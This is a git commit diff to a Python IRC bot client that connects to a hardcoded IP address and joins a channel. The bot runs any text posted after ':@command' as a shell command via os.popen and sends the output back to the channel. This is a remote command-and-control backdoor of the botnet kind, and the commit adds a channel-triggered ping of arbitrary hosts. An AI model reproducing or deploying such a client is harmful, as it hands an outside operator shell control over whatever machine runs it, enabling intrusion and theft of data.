5ace9a407a6f901d4492a14b59f9202bffd9006c
DevinM4 <devin8821@gmail.com>
2021-01-16 01:43:16 -0500

    Lots of updates and bug fixes. Added ping command

--- Client/client.py
+++ Client/client.py
@@ -1,30 +1,29 @@
 #!/usr/bin/python3
+import platform    # For getting the operating system name
+import subprocess  # For executing a shell command
 import socket
-<<<<<<< HEAD
-=======
 import os
->>>>>>> dev
 from time import time,sleep
 ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
 def pong(): # respond to server Pings.
     ircsock.send("PONG :pingisn");
 
 def connect():
-    server = "50.30.177.91"; # Server
+    server = "75.90.61.240"; # Server
     channel = "#bot-testing"; # Channel
     botnick = "B0t"; # Your bots nick
     ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667
 
     sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
-    ircsock.send(sendstr);
+    ircsock.sendall((sendstr).encode('utf-8'));
 
-    ircsock.send("NICK "+ botnick +"\r\n") # assign the nick to the bot
+    ircsock.sendall(("NICK "+ botnick +"\r\n").encode('utf-8')) # assign the nick to the bot
 
     while 1:
         ircmsg = ircsock.recv(2048).decode("utf-8")
         print (ircmsg);
         if ircmsg.find ( 'PING' ) != -1:
-            ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
+            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
             last_ping = time()
             break;
 #    joinchan('#bot-testing')
@@ -46,7 +45,7 @@ def connect():
 
 def joinchan(chan): # join channel(s).
     print("JOINING")
-    ircsock.send("JOIN "+chan+"\r\n")
+    ircsock.sendall(("JOIN "+chan+"\r\n").encode('utf-8'))
     ircmsg = ""
     while 1:
     #    pong()
@@ -54,24 +53,31 @@ def joinchan(chan): # join channel(s).
         ircmsg = ircmsg.strip("\n\r")
         print(ircmsg)
         if ircmsg.find ( 'PING' ) != -1:
-            ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
+            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
             last_ping = time()
-<<<<<<< HEAD
-=======
         if ircmsg.lower().find(":@hi") != -1:
-            ircsock.send("PRIVMSG " + chan +" :Hello!\r\n" );
+            ircsock.send(("PRIVMSG " + chan +" :Hello!\r\n" ).encode('utf-8'))
         if ircmsg.lower().find(":@command") != -1:
             cmd = ircmsg.lower()[ircmsg.lower().find(":@command")+10:len(str(ircmsg))];
             stream = os.popen(cmd)
             output = stream.read()
-            ircsock.send("PRIVMSG " + chan + " :"+output+'\r'+'\n');
+            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
         if ircmsg.lower().find(":@message") != -1:
             cmd = ircmsg.lower()[ircmsg.lower().find(":@message")+10:len(str(ircmsg))];
-            ircsock.send("PRIVMSG " + chan + " :"+cmd+'\r'+'\n');
->>>>>>> dev
+            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
+        if ircmsg.lower().find(":@ping") != -1:
+            cmd = ircmsg.lower()[ircmsg.lower().find(":@ping")+7:len(str(ircmsg))];
+            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
+            callPing(cmd)
+        if ircmsg.lower().find(":@exit") != -1:
+            ircsock.shutdown(socket.SHUT_RDWR)
+def callPing(host):
+    param = '-n' if platform.system().lower()=='windows' else '-c'
+    command = ['ping', param, '1', host]
+    return subprocess.call(command) == 0
 
 chan = '#bot-testing'
 
-connect();
+connect()
 #sleep(10);
 joinchan('#bot-testing')
